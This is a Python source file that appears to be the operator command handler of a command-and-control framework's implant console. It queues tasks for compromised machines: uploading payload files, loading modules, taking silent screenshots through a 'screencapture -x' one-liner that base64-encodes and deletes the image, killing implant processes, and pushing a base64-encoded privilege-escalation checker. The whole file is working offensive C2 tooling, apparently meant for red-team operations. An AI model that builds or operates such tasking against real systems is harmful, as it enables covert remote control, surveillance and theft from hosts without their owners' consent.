import base64, re, traceback, os, sys
from Alias import py_alias
from Colours import Colours
from Utils import validate_sleep_time
from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid, new_c2_message
from AutoLoads import check_module_loaded
from Help import py_help1
from Config import ModulesDirectory, PayloadsDirectory, ROOTDIR
from Utils import argp
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from CommandPromptCompleter import FilePathCompleter

def handle_py_command(command, user, randomuri, startup, implant_id, commandloop):

    command = command.strip()

    # alias mapping
    for alias in py_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    if command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
            print(Colours.RED)
            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
        else:
            command = '$sleeptime = %s' % new_sleep
            new_task(command, user, randomuri)
            update_sleep(new_sleep, randomuri)

    elif (command.startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)

    elif command == "quit":
        ri = input("Are you sure you want to quit? (Y/n) ")
        if ri.lower() == "n":
            startup(user)
        if ri == "" or ri.lower() == "y":
            new_c2_message("%s logged off." % user)
            sys.exit(0)

    elif command.startswith("searchhelp"):
        searchterm = (command).replace("searchhelp ", "")
        helpful = py_help1.split('\n')
        for line in helpful:
            if searchterm in line.lower():
                print(Colours.GREEN + line)

    elif command.startswith("unhide-implant"):
        unhide_implant(randomuri)

    elif command.startswith("hide-implant"):
        kill_implant(randomuri)

    elif command == 'sai' or command == 'migrate':
        new_task('startanotherimplant', user, randomuri)

    elif command.startswith("upload-file"):
        source = ""
        destination = ""
        s = ""
        if command == "upload-file":
            style = Style.from_dict({
                '': '#80d130',
            })
            session = PromptSession(history=FileHistory('%s/.upload-history' % ROOTDIR), auto_suggest=AutoSuggestFromHistory(), style=style)
            try:
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            except KeyboardInterrupt:
                commandloop(implant_id, user)
            while not os.path.isfile(source):
                print("File does not exist: %s" % source)
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            destination = session.prompt("Location to upload to: ")
        else:
            args = argp(command)
            source = args.source
            destination = args.destination
        try:
            with open(source, "rb") as source_file:
                s = source_file.read()
            if s:
                sourceb64 = base64.b64encode(s).decode("utf-8")
                destination = destination.replace("\\", "\\\\")
                print("")
                print("Uploading %s to %s" % (source, destination))
                uploadcommand = "upload-file \"%s\":%s" % (destination, sourceb64)
                new_task(uploadcommand, user, randomuri)
            else:
                print("Source file could not be read or was empty")
        except Exception as e:
            print("Error with source file: %s" % e)
            traceback.print_exc()

    elif command == "help" or command == "?":
        print(py_help1)

    elif command.startswith("loadmoduleforce"):
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)

    elif command.startswith("loadmodule"):
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif command.startswith("get-screenshot"):
        taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
        new_task(taskcmd, user, randomuri)

    elif command == "kill-implant" or command == "exit":
        impid = get_implantdetails(randomuri)
        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
            print("Implant not terminated")
        if ri == "":
            pid = get_pid(randomuri)
            new_task("kill -9 %s" % pid, user, randomuri)
            kill_implant(randomuri)
        if ri.lower() == "y":
            pid = get_pid(randomuri)
            new_task("kill -9 %s" % pid, user, randomuri)
            kill_implant(randomuri)

    elif command == "back" or command == "clear":
        startup(user)

    elif command.startswith("linuxprivchecker"):
        params = re.compile("linuxprivchecker", re.IGNORECASE)
        params = params.sub("", command)
        module = open("%slinuxprivchecker.py" % ModulesDirectory, 'rb').read()
        encoded_module = base64.b64encode(module).decode("utf-8")
        taskcmd = "linuxprivchecker -pycode %s %s" % (encoded_module, params)
        new_task(taskcmd, user, randomuri)

    else:
        if command:
            new_task(command, user, randomuri)
        return
